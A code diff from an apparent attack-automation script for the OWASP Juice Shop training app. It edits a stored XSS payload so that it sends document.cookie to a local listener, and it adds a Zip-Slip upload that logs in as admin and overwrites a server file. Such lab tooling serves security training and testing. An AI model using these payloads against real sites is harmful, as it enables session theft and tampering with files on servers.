@@ -1,6 +1,7 @@
 import time
 import pickle
 import requests
+import os
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from abc import ABC, abstractmethod 
@@ -19,6 +20,7 @@ class Attack(ABC):
         self.chrome_options = Options()
         self.chrome_options.add_argument("--no-sandbox")
         self.chrome_options.add_argument("--window-size=1480,996")
+        self.dirname = os.path.dirname(__file__)
         super().__init__()
 
     @abstractmethod
@@ -146,10 +148,7 @@ class XSSAttack(Attack):
 
         url = self.base_url + "/api/Users"
     
-        payload = 
-            "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/" + 
-            random_word + 
-            ".php?c=\\\"+document.cookie>\", \"password\": \"xss\"}"
+        payload = "{\"email\": \"<img src=\\\"http://127.0.0.1:8081/cookie.php?c=\\\"+document.cookie>\", \"password\": \"xss\"}"
         headers = {
             'Content-Type': 'application/json'
         }
@@ -226,6 +225,38 @@ class RemoteCodeExecution(Attack):
         # execute malicious payload
         driver.find_element_by_xpath("/html/body/div/section/div[2]/div[2]/div[4]/section/div/span/div/div/span/div/div[2]/div/div[3]/button").click()
         time.sleep(10)
+
+class FileOverride(Attack):
+    """
+    Exploits Zip-Slip vulnerability at /#/complain
+    File traversal to override /ftp/legal.md
+    Zip file contains ../../ftp/legal.md
+    """
+    
+    def __init__(self):
+        super().__init__()
+        self.malicious_zip = os.path.join(self.dirname + '/zipslip.zip')
+
+    def run(self):
+        random_user= User(
+                email='admin@juice-sh.op', 
+                password='admin123',
+                security_question='middlename',
+                user_number=7,
+                visible=False)
+        random_user.login()
+        # access complain form for zip upload
+        random_user.driver.get(self.base_url + "/#/complain")
+        complaint_textarea = random_user.driver.find_element_by_xpath('//*[@id="complaintMessage"]')
+        complaint_textarea.send_keys("something") 
+        time.sleep(2)
+        input_file_path = random_user.driver.find_element_by_xpath('//*[@id="file"]')
+        input_file_path.send_keys(self.malicious_zip)
+        time.sleep(2)
+        # click submit button
+        random_user.driver.find_element_by_xpath('//*[@id="submitButton"]').click()
+        time.sleep(2)
+        random_user.driver.quit()
 
 class TwoFactor:
     """
